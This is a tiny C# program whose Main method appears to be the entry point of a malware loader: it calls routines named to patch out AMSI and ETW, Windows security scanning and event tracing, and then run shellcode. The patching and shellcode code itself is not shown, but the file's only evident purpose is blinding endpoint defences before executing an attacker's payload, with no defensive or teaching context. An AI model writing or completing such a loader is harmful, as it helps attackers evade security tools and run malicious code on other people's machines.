public static class main
{
    public static void Main()
    {
        MemoryPatcher.PatchAMSI();
        MemoryPatcher.PatchETW();
        ShellcodeRunner.RunShellcode();
    }
}

